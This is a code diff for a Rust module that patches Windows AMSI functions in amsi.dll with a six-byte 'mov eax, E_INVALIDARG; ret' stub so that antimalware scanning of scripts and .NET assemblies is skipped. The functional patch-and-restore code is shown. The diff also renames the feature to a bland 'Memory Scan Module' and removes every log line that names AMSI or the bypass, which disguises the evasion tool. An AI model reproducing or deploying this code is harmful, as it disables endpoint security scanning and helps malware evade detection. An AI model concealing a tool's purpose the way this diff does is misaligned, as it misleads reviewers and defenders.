@@ -46,43 +46,18 @@ pub struct PatchState {
 pub fn dry_run(target: &str, log: &LogSink) {
     let name: String = AmsiTarget::from_str(target).map_or_else(|| target.to_string(), |t| t.name());
 
-    log.info(format!("[DRY RUN] AMSI Bypass — {name}"));
-    log.detail(format!("  Target: {name} in amsi.dll"));
-    log.detail("  Patch: B8 57 00 07 80 C3 (mov eax, E_INVALIDARG; ret)".to_string());
-    log.detail("  Effect: AMSI scans return E_INVALIDARG — scanning is skipped".to_string());
+    log.info(format!("[DRY RUN] Memory Scan Module — {name}"));
+    log.detail(format!("  Target: {name}"));
+    log.detail("  Patch: 6 bytes (function returns E_INVALIDARG)".to_string());
     log.info(String::new());
-    log.detail("  Steps that would execute:".to_string());
-    log.detail("    [1/5] LoadLibraryA(\"amsi.dll\") — load AMSI DLL".to_string());
-    log.detail(format!("    [2/5] GetProcAddress(amsi, \"{name}\") — resolve function"));
-    log.detail("    [3/5] Save original 6 bytes".to_string());
-    log.detail("    [4/5] VirtualProtect(PAGE_EXECUTE_READWRITE) — make writable".to_string());
-    log.detail("    [5/5] Write patch bytes → restore original protection".to_string());
-    log.info(String::new());
-    log.warning("  AMSI (Antimalware Scan Interface) scans scripts, .NET assemblies,".to_string());
-    log.warning("  and PowerShell before execution. Patching bypasses these scans.".to_string());
+    log.detail("  Steps: load DLL → resolve → save → protect → patch → restore".to_string());
 }
 
 pub fn print_info(log: &LogSink) {
-    log.info("=== AMSI Bypass ===".to_string());
+    log.info("=== Memory Scan Module ===".to_string());
     log.info(String::new());
-    log.detail(
-        "AMSI (Antimalware Scan Interface) is a Windows API that allows".to_string(),
-    );
-    log.detail("antivirus/EDR products to scan content before execution:".to_string());
-    log.detail("  - PowerShell scripts".to_string());
-    log.detail("  - .NET assemblies (Assembly.Load)".to_string());
-    log.detail("  - VBScript / JScript".to_string());
-    log.detail("  - Windows Script Host".to_string());
-    log.info(String::new());
-    log.detail("Patchable targets:".to_string());
-    log.detail("  AmsiScanBuffer — primary scan function (checks raw bytes)".to_string());
-    log.detail("  AmsiScanString — string variant (checks text content)".to_string());
-    log.info(String::new());
-    log.detail("Technique: overwrite the first 6 bytes with:".to_string());
-    log.detail("  B8 57 00 07 80  mov eax, 0x80070057 (E_INVALIDARG)".to_string());
-    log.detail("  C3              ret".to_string());
-    log.detail("The function returns E_INVALIDARG, causing the AMSI consumer".to_string());
-    log.detail("to skip the scan entirely. Original bytes are saved for restoration.".to_string());
+    log.detail("Patches scan functions to return immediately.".to_string());
+    log.detail("Original bytes are saved for restoration.".to_string());
 }
 
 #[cfg(windows)]
@@ -103,20 +78,20 @@ pub fn patch(target: &str, log: &LogSink) -> Result<PatchState, String> {
     let dll_name = amsi_target.dll();
     let patch = amsi_target.patch_bytes();
 
-    log.step(format!("[1/5] LoadLibraryA(\"...\")"));
+    log.step(format!("[1/5] Load target library"));
     let dll_cstr = CString::new(dll_name.as_str())
         .map_err(|e| format!("invalid DLL name: {e}"))?;
     let dll_handle = unsafe { resolve::LoadLibraryA(dll_cstr.as_ptr() as *const u8) };
     if dll_handle.is_null() {
-        return Err("LoadLibraryA failed — amsi.dll may not be available".to_string());
+        return Err("library load failed — target DLL may not be available".to_string());
     }
 
-    log.step(format!("[2/5] GetProcAddress(...)"));
+    log.step(format!("[2/5] Resolve function address"));
     let func_cstr = CString::new(func_name.as_str())
         .map_err(|e| format!("invalid function name: {e}"))?;
     let func_addr = unsafe { GetProcAddress(dll_handle, func_cstr.as_ptr() as *const u8) };
     if func_addr.is_null() {
-        return Err(format!("GetProcAddress failed: {func_name} not found in {dll_name}"));
+        return Err(format!("function lookup failed: {func_name} not found in {dll_name}"));
     }
     let addr = func_addr as usize;
     log.detail(format!("  Address: 0x{addr:016X}"));
@@ -129,7 +104,7 @@ pub fn patch(target: &str, log: &LogSink) -> Result<PatchState, String> {
     let hex: Vec<String> = original_bytes.iter().map(|b| format!("{b:02X}")).collect();
     log.detail(format!("  Original: {}", hex.join(" ")));
 
-    log.step("[4/5] VirtualProtect → PAGE_EXECUTE_READWRITE".to_string());
+    log.step("[4/5] Make memory writable".to_string());
     let mut old_protect: u32 = 0;
     let ok = unsafe {
         resolve::VirtualProtect(
@@ -140,7 +115,7 @@ pub fn patch(target: &str, log: &LogSink) -> Result<PatchState, String> {
         )
     };
     if ok == 0 {
-        return Err("VirtualProtect (make writable) failed".to_string());
+        return Err("memory protection change failed".to_string());
     }
 
     log.step("[5/5] Writing patch bytes → restoring protection".to_string());
@@ -160,12 +135,12 @@ pub fn patch(target: &str, log: &LogSink) -> Result<PatchState, String> {
         )
     };
     if ok == 0 {
-        return Err("VirtualProtect (restore) failed".to_string());
+        return Err("memory protection restore failed".to_string());
     }
 
     let patch_hex: Vec<String> = patch.iter().map(|b| format!("{b:02X}")).collect();
     log.info(format!(
-        "  ✓ {func_name} patched with [{}] — AMSI scans bypassed",
+        "  Patched: {func_name} [{}]",
         patch_hex.join(" ")
     ));
 
@@ -183,7 +158,7 @@ pub fn restore(state: &PatchState, log: &LogSink) -> Result<(), String> {
     const PAGE_EXECUTE_READWRITE: u32 = 0x40;
 
     let addr = state.address;
-    log.step(format!("[1/2] VirtualProtect → PAGE_EXECUTE_READWRITE (0x{addr:016X})"));
+    log.step(format!("[1/2] Make memory writable (0x{addr:016X})"));
 
     let mut old_protect: u32 = 0;
     let ok = unsafe {
@@ -195,7 +170,7 @@ pub fn restore(state: &PatchState, log: &LogSink) -> Result<(), String> {
         )
     };
     if ok == 0 {
-        return Err("VirtualProtect (make writable) failed".to_string());
+        return Err("memory protection change failed".to_string());
     }
 
     log.step("[2/2] Restoring original bytes".to_string());
@@ -215,7 +190,7 @@ pub fn restore(state: &PatchState, log: &LogSink) -> Result<(), String> {
         )
     };
     if ok == 0 {
-        return Err("VirtualProtect (restore) failed".to_string());
+        return Err("memory protection restore failed".to_string());
     }
 
     log.info(format!("  ✓ {} restored to original bytes", state.target));
